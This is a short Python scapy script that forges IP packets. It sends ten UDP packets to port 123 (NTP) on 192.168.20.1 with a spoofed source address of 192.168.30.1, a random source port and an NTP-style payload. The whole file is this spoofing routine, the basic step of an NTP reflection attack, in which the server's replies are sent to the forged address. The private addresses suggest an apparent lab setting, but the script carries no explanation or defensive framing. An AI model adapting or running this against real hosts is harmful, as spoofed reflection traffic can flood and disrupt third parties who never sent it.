from scapy.all import *
import time

A= "192.168.30.1"
B= "192.168.20.1"
C= RandShort()
D= "\x1b\x00\x03\x2a" + "\x00" * 44

spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=123) / D
send(spoofed_packet, count=10)
